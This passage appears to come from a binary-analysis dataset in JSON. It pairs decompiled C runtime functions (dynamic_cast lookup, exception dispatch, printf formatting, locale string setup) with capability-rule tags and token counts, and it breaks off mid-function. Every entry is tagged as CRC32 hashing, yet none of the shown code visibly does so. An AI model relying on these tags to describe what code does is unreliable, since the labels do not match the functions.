        "decompiled_code": "\nint32_t * __cdecl fcn.00453eb3(uint arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    uint8_t *puVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint8_t *puVar8;\n    int32_t *piVar9;\n    uint32_t uVar10;\n    bool bVar11;\n    uint var_14h;\n    uint var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    int32_t *var_4h;\n    \n    var_ch = 0;\n    piVar9 = NULL;\n    uVar10 = 0;\n    var_4h = NULL;\n    var_8h = 0xffffffff;\n    iVar2 = *(*(arg_ch + 0x10) + 0xc);\n    uVar3 = *(*(arg_ch + 0x10) + 8);\n    if (uVar3 == 0) {\n        return NULL;\n    }\n    do {\n        piVar4 = *(iVar2 + uVar10 * 4);\n        if (var_ch < uVar10 - var_8h) {\n            if (*piVar4 != arg_18h) {\n                puVar8 = arg_18h + 8;\n                puVar5 = *piVar4 + 8;\n                do {\n                    uVar1 = *puVar5;\n                    bVar11 = uVar1 < *puVar8;\n                    if (uVar1 != *puVar8) {\ncode_r0x00453f23:\n                        uVar6 = -bVar11 | 1;\n                        goto code_r0x00453f28;\n                    }\n                    if (uVar1 == 0) break;\n                    uVar1 = puVar5[1];\n                    bVar11 = uVar1 < puVar8[1];\n                    if (uVar1 != puVar8[1]) goto code_r0x00453f23;\n                    puVar5 = puVar5 + 2;\n                    puVar8 = puVar8 + 2;\n                } while (uVar1 != 0);\n                uVar6 = 0;\ncode_r0x00453f28:\n                if (uVar6 != 0) goto code_r0x00453f3e;\n            }\n            piVar9 = piVar4;\n            if (var_4h != NULL) {\n                if ((*(piVar4 + 5) & 3) != 0) {\n                    return NULL;\n                }\n                uVar1 = *(var_4h + 5);\n                goto joined_r0x00453fb2;\n            }\n            var_ch = piVar4[1];\n            var_8h = uVar10;\n        }\ncode_r0x00453f3e:\n        if (*piVar4 == arg_10h) {\ncode_r0x00453f76:\n            iVar7 = fcn.0045429b(arg_8h, piVar4 + 2);\n            if ((iVar7 == arg_14h) && (var_4h = piVar4,  piVar9 != NULL)) {\n                if (var_ch < uVar10 - var_8h) {\n                    if ((*(piVar9 + 5) & 3) != 0) {\n                        return NULL;\n                    }\n                    uVar1 = *(piVar4 + 5);\n                }\n                else if ((*(piVar9 + 5) & 0x40) == 0) {\n                    if (var_8h != 0) {\n                        return piVar9;\n                    }\n                    uVar1 = *(piVar4 + 5);\n                }\n                else {\n                    uVar1 = *(*(*(piVar9[6] + 0xc) + (uVar10 - var_8h) * 4) + 0x14);\n                }\njoined_r0x00453fb2:\n                if ((uVar1 & 1) != 0) {\n                    return NULL;\n                }\n                return piVar9;\n            }\n        }\n        else {\n            puVar8 = arg_10h + 8;\n            puVar5 = *piVar4 + 8;\n            do {\n                uVar1 = *puVar5;\n                bVar11 = uVar1 < *puVar8;\n                if (uVar1 != *puVar8) {\ncode_r0x00453f6d:\n                    uVar6 = -bVar11 | 1;\n                    goto code_r0x00453f72;\n                }\n                if (uVar1 == 0) break;\n                uVar1 = puVar5[1];\n                bVar11 = uVar1 < puVar8[1];\n                if (uVar1 != puVar8[1]) goto code_r0x00453f6d;\n                puVar5 = puVar5 + 2;\n                puVar8 = puVar8 + 2;\n            } while (uVar1 != 0);\n            uVar6 = 0;\ncode_r0x00453f72:\n            if (uVar6 == 0) goto code_r0x00453f76;\n        }\n        uVar10 = uVar10 + 1;\n        if (uVar3 <= uVar10) {\n            return NULL;\n        }\n    } while( true );\n}\n",
        "token_count": 1217
    },
    "004542f7": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004542f7(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    uint arg_18h_00;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t arg_14h_00;\n    int32_t unaff_EBP;\n    int32_t arg_8h_00;\n    uint var_24h;\n    uint var_4h;\n    \n    fcn.0043b410(0x48ee90, 0x14);\n    piVar1 = *(unaff_EBP + 8);\n    if (piVar1 != NULL) {\n        *(unaff_EBP + -4) = 0;\n        iVar4 = *(*piVar1 + -4);\n        arg_8h_00 = piVar1 + (-(-(*(iVar4 + 8) != 0) & *(piVar1 - *(iVar4 + 8))) - *(iVar4 + 4));\n        uVar2 = *(*(iVar4 + 0x10) + 4);\n        arg_18h_00 = *(unaff_EBP + 0x14);\n        if ((uVar2 & 1) == 0) {\n            iVar4 = fcn.00453ffa(iVar4, *(unaff_EBP + 0x10), arg_18h_00);\n        }\n        else {\n            arg_14h_00 = piVar1 + (-arg_8h_00 - *(unaff_EBP + 0xc));\n            if ((uVar2 & 2) == 0) {\n                iVar4 = fcn.00453eb3(arg_8h_00, iVar4, *(unaff_EBP + 0x10), arg_14h_00, arg_18h_00);\n            }\n            else {\n                iVar4 = fcn.004540e5(arg_8h_00, iVar4, *(unaff_EBP + 0x10), arg_14h_00, arg_18h_00);\n            }\n        }\n        if (iVar4 == 0) {\n            if (*(unaff_EBP + 0x18) != 0) {\n                fcn.004542db(unaff_EBP + -0x24, \"Bad dynamic_cast!\");\n                fcn.00451487(unaff_EBP + -0x24, 0x48c838);\n                pcVar3 = swi(3);\n                (*pcVar3)();\n                return;\n            }\n            *(unaff_EBP + -4) = 0xfffffffe;\n        }\n        else {\n            fcn.0045429b(arg_8h_00, iVar4 + 8);\n            *(unaff_EBP + -4) = 0xfffffffe;\n        }\n    }\n    fcn.0043b456();\n    return;\n}\n",
        "token_count": 664
    },
    "00454e0c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00454e0c(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint8_t *puVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    uint uVar6;\n    int32_t unaff_EBP;\n    int32_t *piVar7;\n    uint var_20h;\n    uint var_1ch;\n    uint uVar8;\n    uint var_4h;\n    \n    fcn.0043b410(0x48efd0, 0x10);\n    puVar1 = *(unaff_EBP + 0x10);\n    if (((puVar1[1] == 0) || (*(puVar1[1] + 8) == '\\0')) || ((puVar1[2] == 0 && (-1 < *puVar1)))) goto code_r0x00454f34;\n    uVar2 = *puVar1;\n    piVar7 = *(unaff_EBP + 0xc);\n    if (-1 < uVar2) {\n        piVar7 = piVar7 + puVar1[2] + 0xc;\n    }\n    *(unaff_EBP + -4) = 0;\n    iVar5 = *0x4958bc;\n    puVar3 = *(unaff_EBP + 0x14);\n    if (((uVar2 < '\\0') && ((*puVar3 & 0x10) != 0)) && (*(unaff_EBP + -0x1c) = *0x4958bc,  iVar5 != 0)) {\n        (**0x4742a4)();\n        iVar5 = (**(unaff_EBP + -0x1c))();\ncode_r0x00454e83:\n        if ((iVar5 == 0) || (piVar7 == NULL)) {\ncode_r0x00454f3a:\n            fcn.004567ea();\n            pcVar4 = swi(3);\n            (*pcVar4)();\n            return;\n        }\n        *piVar7 = iVar5;\ncode_r0x00454ed3:\n        iVar5 = fcn.0045122c(iVar5, puVar3 + 8);\n        *piVar7 = iVar5;\n    }\n    else {\n        iVar5 = *(unaff_EBP + 8);\n        if ((uVar2 & 8) != 0) {\n            iVar5 = *(iVar5 + 0x18);\n            goto code_r0x00454e83;\n        }\n        if ((*puVar3 & 1) != 0) {\n            if ((*(iVar5 + 0x18) == 0) || (piVar7 == NULL)) goto code_r0x00454f3a;\n            fcn.00451a80(piVar7, *(iVar5 + 0x18), *(puVar3 + 0x14));\n            if ((*(puVar3 + 0x14) != 4) || (*piVar7 == 0)) goto code_r0x00454f1e;\n            iVar5 = *piVar7;\n            goto code_r0x00454ed3;\n        }\n        iVar5 = *(iVar5 + 0x18);\n        if (*(puVar3 + 0x18) == 0) {\n            if ((iVar5 == 0) || (piVar7 == NULL)) goto code_r0x00454f3a;\n            uVar8 = *(puVar3 + 0x14);\n            uVar6 = fcn.0045122c(iVar5, puVar3 + 8);\n            fcn.00451a80(piVar7, uVar6, uVar8);\n        }\n        else {\n            if ((iVar5 == 0) || (piVar7 == NULL)) goto code_r0x00454f3a;\n            *(unaff_EBP + -0x20) = ((*puVar3 & 4) != 0) + 1;\n        }\n    }\ncode_r0x00454f1e:\n    *(unaff_EBP + -4) = 0xfffffffe;\ncode_r0x00454f34:\n    fcn.0043b456();\n    return;\n}\n",
        "token_count": 961
    },
    "0045500d": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.0045500d(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint32_t *arg_18h, int32_t arg_1ch, uint arg_20h\n            , uint32_t arg_24h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    fcn.00455198(arg_10h);\n    iVar2 = fcn.004543fc();\n    if ((((*(iVar2 + 0x20) != 0) || (*arg_8h == -0x1f928c9d)) || (*arg_8h == -0x7fffffda)) ||\n       (((*arg_18h & 0x1fffffff) < 0x19930522 || ((*(arg_18h + 8) & 1) == 0)))) {\n        if ((*(arg_8h + 1) & 0x66) == 0) {\n            if (((arg_18h[3] != 0) || ((0x19930520 < (*arg_18h & 0x1fffffff) && (arg_18h[7] != 0)))) ||\n               ((0x19930521 < (*arg_18h & 0x1fffffff) && ((*(arg_18h + 8) & 4) != 0)))) {\n                if ((((*arg_8h == -0x1f928c9d) && (2 < arg_8h[4])) && (0x19930522 < arg_8h[5])) &&\n                   (pcVar1 = *(arg_8h[7] + 8),  pcVar1 != NULL)) {\n                    (**0x4742a4)(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h & 0xff);\n                    uVar3 = (*pcVar1)();\n                    return uVar3;\n                }\n                fcn.00454845(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_24h, arg_1ch, arg_20h);\n            }\n        }\n        else if ((arg_18h[1] != 0) && (arg_1ch == 0)) {\n            fcn.00454f40(arg_ch, arg_14h, arg_18h, 0xffffffff);\n        }\n    }\n    return 1;\n}\n",
        "token_count": 566
    },
    "0045adc5": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.0045adc5(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint arg_30h)\n\n{\n    int32_t *arg_14h;\n    uint32_t uVar1;\n    bool bVar2;\n    char cVar3;\n    uchar uVar4;\n    int32_t in_ECX;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint arg_8h;\n    uint arg_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar5 = 1;\n    cVar3 = *(in_ECX + 0x31);\n    var_4h = in_ECX;\n    if (cVar3 < 'e') {\n        if (cVar3 == 'd') {\ncode_r0x0045ae79:\n            *(in_ECX + 0x20) = *(in_ECX + 0x20) | 0x10;\n            goto code_r0x0045ae7d;\n        }\n        if ('X' < cVar3) {\n            if (cVar3 == 'Z') {\n                cVar3 = fcn.0045b075();\n                goto code_r0x0045ae15;\n            }\n            if (cVar3 != 'a') {\n                if (cVar3 != 'c') {\n                    return 0;\n                }\ncode_r0x0045ae39:\n                cVar3 = fcn.0045b22f(0);\n                goto code_r0x0045ae15;\n            }\ncode_r0x0045ae89:\n            cVar3 = fcn.0045b0d6();\n            goto code_r0x0045ae15;\n        }\n        if (cVar3 != 'X') {\n            if (cVar3 != 'A') {\n                if (cVar3 == 'C') goto code_r0x0045ae39;\n                if (cVar3 < 'E') {\n                    return 0;\n                }\n                if ('G' < cVar3) {\n                    if (cVar3 != 'S') {\n                        return 0;\n                    }\n                    goto code_r0x0045ae0e;\n                }\n            }\n            goto code_r0x0045ae89;\n        }\n        arg_ch = 1;\ncode_r0x0045ae25:\n        arg_8h = 0x10;\n    }\n    else {\n        if (cVar3 < 'q') {\n            if (cVar3 == 'p') {\n                cVar3 = fcn.0045b4a5();\n                goto code_r0x0045ae15;\n            }\n            if (cVar3 < 'h') goto code_r0x0045ae89;\n            if (cVar3 != 'i') {\n                if (cVar3 == 'n') {\n                    cVar3 = fcn.0045b412();\n                }\n                else {\n                    if (cVar3 != 'o') {\n                        return 0;\n                    }\n                    cVar3 = fcn.0045b486();\n                }\n                goto code_r0x0045ae15;\n            }\n            goto code_r0x0045ae79;\n        }\n        if (cVar3 == 's') {\ncode_r0x0045ae0e:\n            cVar3 = fcn.0045b4bd();\n            goto code_r0x0045ae15;\n        }\n        if (cVar3 != 'u') {\n            if (cVar3 != 'x') {\n                return 0;\n            }\n            arg_ch = 0;\n            goto code_r0x0045ae25;\n        }\ncode_r0x0045ae7d:\n        arg_ch = 0;\n        arg_8h = 10;\n    }\n    cVar3 = fcn.0045b2bf(arg_8h, arg_ch);\ncode_r0x0045ae15:\n    if (cVar3 == '\\0') {\n        return 0;\n    }\n    if (*(in_ECX + 0x30) != '\\0') {\n        return 1;\n    }\n    uVar1 = *(in_ECX + 0x20);\n    var_4h = var_4h._3_1_ << 0x18;\n    iVar6 = 0;\n    if ((uVar1 >> 4 & 1) != 0) {\n        iVar6 = iVar5;\n        if ((uVar1 >> 6 & 1) == 0) {\n            if ((uVar1 & 1) == 0) {\n                iVar6 = 0;\n                if ((uVar1 >> 1 & 1) != 0) {\n                    var_4h = CONCAT31(var_4h._1_3_, 0x20);\n                    iVar6 = iVar5;\n                }\n            }\n            else {\n                var_4h = CONCAT31(var_4h._1_3_, 0x2b);\n            }\n        }\n        else {\n            var_4h = CONCAT31(var_4h._1_3_, 0x2d);\n        }\n    }\n    cVar3 = *(in_ECX + 0x31);\n    if (((cVar3 != 'x') && (cVar3 != 'X')) || ((uVar1 >> 5 & 1) == 0)) {\n        iVar5 = 0;\n    }\n    if ((cVar3 == 'a') || (cVar3 == 'A')) {\n        bVar2 = true;\n    }\n    else {\n        bVar2 = false;\n    }\n    if ((iVar5 != '\\0') || (bVar2)) {\n        *(&var_4h + iVar6) = 0x30;\n        if ((cVar3 == 'X') || (cVar3 == 'A')) {\n            uVar4 = 0x58;\n        }\n        else {\n            uVar4 = 0x78;\n        }\n        *(&var_4h + iVar6 + 1) = uVar4;\n        iVar6 = iVar6 + 2;\n    }\n    arg_14h = in_ECX + 0x18;\n    iVar5 = (*(in_ECX + 0x24) - *(in_ECX + 0x38)) - iVar6;\n    if ((uVar1 & 0xc) == 0) {\n        fcn.0045a7dd(in_ECX + 0x448, 0x20, iVar5, arg_14h);\n    }\n    fcn.0045b63b(&var_4h, iVar6, arg_14h);\n    if (((*(in_ECX + 0x20) >> 3 & 1) != 0) && ((*(in_ECX + 0x20) >> 2 & 1) == 0)) {\n        fcn.0045a7dd(in_ECX + 0x448, 0x30, iVar5, arg_14h);\n    }\n    fcn.0045b592(0);\n    if ((-1 < *arg_14h) && ((*(in_ECX + 0x20) >> 2 & 1) != 0)) {\n        fcn.0045a7dd(in_ECX + 0x448, 0x20, iVar5, arg_14h);\n    }\n    return 1;\n}\n",
        "token_count": 1654
    },
    "0045b2bf": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0045b2bf(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    int32_t in_ECX;\n    uint32_t uVar5;\n    uint32_t arg_ch_00;\n    bool bVar6;\n    uint var_4h;\n    \n    iVar1 = fcn.0045b019(*(in_ECX + 0x2c));\n    if (iVar1 == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n        else {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n    }\n    else if (iVar1 == 2) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n        else {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n    }\n    else {\n        if (iVar1 != 4) {\n            if (iVar1 != 8) {\n                puVar2 = fcn.0045652e();\n                *puVar2 = 0x16;\n                uVar3 = fcn.004559dd();\n                return uVar3 & 0xffffff00;\n            }\n            *(in_ECX + 0x14) = *(in_ECX + 0x14) + 8;\n            uVar3 = *(*(in_ECX + 0x14) + -8);\n            arg_ch_00 = *(*(in_ECX + 0x14) + -4);\n            goto code_r0x0045b375;\n        }\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n            arg_ch_00 = 0;\n            goto code_r0x0045b375;\n        }\n        uVar3 = *(*(in_ECX + 0x14) + -4);\n    }\n    arg_ch_00 = uVar3 >> 0x1f;\ncode_r0x0045b375:\n    uVar5 = *(in_ECX + 0x20);\n    if ((((uVar5 >> 4 & 1) != 0) && (arg_ch_00 < 1)) && (arg_ch_00 < 0)) {\n        bVar6 = uVar3 != 0;\n        uVar3 = -uVar3;\n        arg_ch_00 = -(arg_ch_00 + bVar6);\n        uVar5 = uVar5 | 0x40;\n        *(in_ECX + 0x20) = uVar5;\n    }\n    if (*(in_ECX + 0x28) < 0) {\n        *(in_ECX + 0x28) = 1;\n    }\n    else {\n        *(in_ECX + 0x20) = uVar5 & 0xfffffff7;\n        fcn.0045a60d(*(in_ECX + 0x28));\n    }\n    if ((uVar3 | arg_ch_00) == 0) {\n        *(in_ECX + 0x20) = *(in_ECX + 0x20) & 0xffffffdf;\n    }\n    *(in_ECX + 0x3c) = 0;\n    if (iVar1 == 8) {\n        fcn.0045a74e(uVar3, arg_ch_00, arg_8h, arg_ch);\n    }\n    else {\n        fcn.0045a6db(uVar3, arg_8h, arg_ch);\n    }\n    pcVar4 = *(in_ECX + 0x20) >> 7;\n    if (((pcVar4 & 1) != 0) && ((*(in_ECX + 0x38) == 0 || (pcVar4 = *(in_ECX + 0x34),  *pcVar4 != '0')))) {\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -1;\n        **(in_ECX + 0x34) = 0x30;\n        *(in_ECX + 0x38) = *(in_ECX + 0x38) + 1;\n    }\n    return CONCAT31(pcVar4 >> 8, 1);\n}\n",
        "token_count": 1120
    },
    "0045b486": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045b486(int32_t param_1)\n\n{\n    if ((*(param_1 + 0x20) >> 5 & 1) != 0) {\n        *(param_1 + 0x20) = *(param_1 + 0x20) | 0x80;\n    }\n    fcn.0045b2bf(8, 0);\n    return;\n}\n",
        "token_count": 93
    },
    "0045d9dd": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0045d9dd(void)\n\n{\n    int16_t *piVar1;\n    char cVar2;\n    int16_t iVar3;\n    char **ppcVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    char *pcVar8;\n    int16_t *piVar9;\n    char **ppcVar10;\n    char *pcVar11;\n    char *pcVar12;\n    int16_t **ppiVar13;\n    int32_t var_28h;\n    int32_t var_24h;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint var_14h;\n    char *var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    fcn.004562ff(0);\n    var_10h = NULL;\n    pcVar11 = 0x164;\n    var_8h = 0;\n    ppcVar4 = *(var_24h + 0x9c);\n    var_ch = 0;\n    do {\n        pcVar12 = pcVar11;\n        if (var_8h == 1) {\n            iVar6 = fcn.0046186a(pcVar11);\n            var_ch = 0;\n            if (iVar6 == 0) break;\n            fcn.00452000(iVar6, 0, pcVar11);\n            pcVar12 = 0x164;\n            var_10h = pcVar11;\n            var_ch = iVar6;\n        }\n        iVar6 = var_ch - ppcVar4;\n        var_18h = 0;\n        ppcVar10 = ppcVar4;\n        do {\n            if (var_8h == 1) {\n                *(iVar6 + ppcVar10) = pcVar12 + var_ch;\n                iVar7 = fcn.00461178(pcVar12 + var_ch, var_10h - pcVar12, *ppcVar10);\n                if (iVar7 != 0) goto code_r0x0045e0d0;\n            }\n            pcVar8 = *ppcVar10;\n            pcVar11 = pcVar8 + 1;\n            do {\n                cVar2 = *pcVar8;\n                pcVar8 = pcVar8 + 1;\n            } while (cVar2 != '\\0');\n            pcVar12 = pcVar8 + pcVar12 + (1 - pcVar11);\n            var_18h = var_18h + 1;\n            ppcVar10 = ppcVar10 + 1;\n        } while (var_18h < 7);\n        var_18h = 0;\n        ppcVar10 = ppcVar4 + 7;\n        do {\n            if (var_8h == 1) {\n                *(ppcVar10 + iVar6) = pcVar12 + var_ch;\n                iVar7 = fcn.00461178(pcVar12 + var_ch, var_10h - pcVar12, *ppcVar10);\n                if (iVar7 != 0) goto code_r0x0045e0d0;\n            }\n            pcVar8 = *ppcVar10;\n            pcVar11 = pcVar8 + 1;\n            do {\n                cVar2 = *pcVar8;\n                pcVar8 = pcVar8 + 1;\n            } while (cVar2 != '\\0');\n            pcVar12 = pcVar8 + pcVar12 + (1 - pcVar11);\n            ppcVar10 = ppcVar10 + 1;\n            var_18h = var_18h + 1;\n        } while (var_18h < 7);\n        var_18h = 0;\n        ppcVar10 = ppcVar4 + 0xe;\n        do {\n            if (var_8h == 1) {\n                *(ppcVar10 + iVar6) = pcVar12 + var_ch;\n                iVar7 = fcn.00461178(pcVar12 + var_ch, var_10h - pcVar12, *ppcVar10);\n                if (iVar7 != 0) goto code_r0x0045e0d0;\n            }\n            pcVar8 = *ppcVar10;\n            pcVar11 = pcVar8 + 1;\n            do {\n                cVar2 = *pcVar8;\n                pcVar8 = pcVar8 + 1;\n            } while (cVar2 != '\\0');\n            pcVar12 = pcVar8 + pcVar12 + (1 - pcVar11);\n            ppcVar10 = ppcVar10 + 1;\n            var_18h = var_18h + 1;\n        } while (var_18h < 0xc);\n        var_18h = 0;\n        ppcVar10 = ppcVar4 + 0x1a;\n        do {\n            if (var_8h == 1) {\n                *(ppcVar10 + iVar6) = pcVar12 + var_ch;\n                iVar7 = fcn.00461178(pcVar12 + var_ch, var_10h - pcVar12, *ppcVar10);\n                if (iVar7 != 0) goto code_r0x0045e0d0;\n            }\n            pcVar8 = *ppcVar10;\n            pcVar11 = pcVar8 + 1;\n            do {\n                cVar2 = *pcVar8;\n                pcVar8 = pcVar8 + 1;\n            } while (cVar2 != '\\0');\n            pcVar12 = pcVar8 + pcVar12 + (1 - pcVar11);\n            ppcVar10 = ppcVar10 + 1;\n            var_18h = var_18h + 1;\n        } while (var_18h < 0xc);\n        var_18h = 0;\n        ppcVar10 = ppcVar4 + 0x26;\n        do {\n            if (var_8h == 1) {\n                *(ppcVar10 + iVar6) = pcVar12 + var_ch;\n                iVar7 = fcn.00461178(pcVar12 + var_ch, var_10h - pcVar12, *ppcVar10);\n                if (iVar7 != 0) goto code_r0x0045e0d0;\n            }\n            pcVar8 = *ppcVar10;\n            pcVar11 = pcVar8 + 1;\n            do {\n                cVar2 = *pcVar8;\n                pcVar8 = pcVar8 + 1;\n            } while (cVar2 != '\\0');\n            pcVar12 = pcVar8 + pcVar12 + (1 - pcVar11);\n            ppcVar10 = ppcVar10 + 1;\n            var_18h = var_18h + 1;\n        } while (var_18h < 2);\n        if (var_8h == 1) {\n            *(var_ch + 0xa0) = pcVar12 + var_ch;\n            iVar7 = fcn.00461178(pcVar12 + var_ch, var_10h - pcVar12, ppcVar4[0x28]);\n            if (iVar7 != 0) goto code_r0x0045e0d0;\n        }\n        pcVar8 = ppcVar4[0x28];\n        pcVar11 = pcVar8 + 1;\n        do {\n            cVar2 = *pcVar8;\n            pcVar8 = pcVar8 + 1;\n        } while (cVar2 != '\\0');\n        pcVar8 = pcVar8 + pcVar12 + (1 - pcVar11);\n        if (var_8h == 1) {\n            *(var_ch + 0xa4) = pcVar8 + var_ch;\n            iVar7 = fcn.00461178(pcVar8 + var_ch, var_10h - pcVar8, ppcVar4[0x29]);\n            if (iVar7 != 0) goto code_r0x0045e0d0;\n        }\n        pcVar12 = ppcVar4[0x29];\n        pcVar11 = pcVar12 + 1;\n        do {\n            cVar2 = *pcVar12;\n            pcVar12 = pcVar12 + 1;\n        } while (cVar2 != '\\0');\n        pcVar12 = pcVar12 + pcVar8 + (1 - pcVar11);\n        if (var_8h == 1) {\n            *(var_ch + 0xa8) = pcVar12 + var_ch;\n            iVar7 = fcn.00461178(pcVar12 + var_ch, var_10h - pcVar12, ppcVar4[0x2a]);\n            if (iVar7 != 0) goto code_r0x0045e0d0;\n        }\n        pcVar11 = ppcVar4[0x2a];\n        pcVar8 = pcVar11 + 1;\n        do {\n            cVar2 = *pcVar11;\n            pcVar11 = pcVar11 + 1;\n        } while (cVar2 != '\\0');\n        pcVar11 = pcVar11 + pcVar12 + (1 - pcVar8);\n        if (var_8h == 1) {\n            *(var_ch + 0xac) = ppcVar4[0x2b];\n            *(var_ch + 0xb0) = 0;\n        }\n        var_18h = 0;\n        ppiVar13 = ppcVar4 + 0x2d;\n        do {\n            for (; (pcVar11 & 1) != 0; pcVar11 = pcVar11 + 1) {\n            }\n            if (var_8h == 1) {\n                iVar7 = var_ch + (pcVar11 & 0xfffffffe);\n                *(ppiVar13 + iVar6) = iVar7;\n                iVar7 = fcn.0045c065(iVar7, var_10h - pcVar11 >> 1, *ppiVar13);\n                if (iVar7 != 0) goto code_r0x0045e0d0;\n            }\n            piVar9 = *ppiVar13;\n            piVar1 = piVar9 + 1;\n            do {\n                iVar3 = *piVar9;\n                piVar9 = piVar9 + 1;\n            } while (iVar3 != 0);\n            ppiVar13 = ppiVar13 + 1;\n            pcVar11 = pcVar11 + (piVar9 - piVar1 >> 1) * 2 + 2;\n            var_18h = var_18h + 1;\n        } while (var_18h < 7);\n        var_18h = 0;\n        ppiVar13 = ppcVar4 + 0x34;\n        do {\n            for (; (pcVar11 & 1) != 0; pcVar11 = pcVar11 + 1) {\n            }\n            if (var_8h == 1) {\n                iVar7 = var_ch + (pcVar11 & 0xfffffffe);\n                *(ppiVar13 + iVar6) = iVar7;\n                iVar7 = fcn.0045c065(iVar7, var_10h - pcVar11 >> 1, *ppiVar13);\n                if (iVar7 != 0) goto code_r0x0045e0d0;\n            }\n            piVar9 = *ppiVar13;\n            piVar1 = piVar9 + 1;\n            do {\n                iVar3 = *piVar9;\n                piVar9 = piVar9 + 1;\n            } while (iVar3 != 0);\n            ppiVar13 = ppiVar13 + 1;\n            pcVar11 = pcVar11 + (piVar9 - piVar1 >> 1) * 2 + 2;\n            var_18h = var_18h + 1;\n        } while (var_18h < 7);\n        var_18h = 0;\n        ppiVar13 = ppcVar4 + 0x3b;\n        do {\n            for (; (pcVar11 & 1) != 0; pcVar11 = pcVar11 + 1) {\n            }\n            if (var_8h == 1) {\n                iVar7 = var_ch + (pcVar11 & 0xfffffffe);\n                *(ppiVar13 + iVar6) = iVar7;\n                iVar7 = fcn.0045c065(iVar7, var_10h - pcVar11 >> 1, *ppiVar13);\n                if (iVar7 != 0) goto code_r0x0045e0d0;\n            }\n            piVar9 = *ppiVar13;\n            piVar1 = piVar9 + 1;\n            do {\n                iVar3 = *piVar9;\n                piVar9 = piVar9 + 1;\n            } while (iVar3 != 0);\n            ppiVar13 = ppiVar13 + 1;\n            pcVar11 = pcVar11 + (piVar9 - piVar1 >> 1) * 2 + 2;\n            var_18h = var_18h + 1;\n        } while (var_18h < 0xc);\n        var_18h = 0;\n        ppiVar13 = ppcVar4 + 0x47;\n        do {\n            for (; (pcVar11 & 1) != 0; pcVar11 = pcVar11 + 1) {\n            }\n            if (var_8h == 1) {\n                iVar7 = var_ch + (pcVar11 & 0xfffffffe);\n                *(ppiVar13 + iVar6) = iVar7;\n                iVar7 = fcn.0045c065(iVar7, var_10h - pcVar11 >> 1, *ppiVar13);\n                if (iVar7 != 0) goto code_r0x0045e0d0;\n            }\n            piVar9 = *ppiVar13;\n            piVar1 = piVar9 + 1;\n            do {\n                iVar3 = *piVar9;\n                piVar9 = piVar9 + 1;\n            } while (iVar3 != 0);\n            ppiVar13 = ppiVar13 + 1;\n            pcVar11 = pcVar11 + (piVar9 - piVar1 >> 1) * 2 + 2;\n            var_18h = var_18h + 1;\n        } while (var_18h < 0xc);\n        var_18h = 0;\n        ppiVar13 = ppcVar4 + 0x53;\n        do {\n            for (; (pcVar11 & 1) != 0; pcVar11 = pcVar11 + 1) {\n            }\n            if (var_8h == 1) {\n                iVar7 = var_ch + (pcVar11 & 0xfffffffe);\n                *(ppiVar13 + iVar6) = iVar7;\n                iVar7 = fcn.0045c065(iVar7, var_10h - pcVar11 >> 1, *ppiVar13);\n                if (iVar7 != 0) goto code_r0x0045e0d0;\n            }\n            piVar9 = *ppiVar13;\n            piVar1 = piVar9 + 1;\n            do {\n                iVar3 = *piVar9;\n                piVar9 = piVar9 + 1;\n            } while (iVar3 != 0);\n            ppiVar13 = ppiVar13 + 1;\n            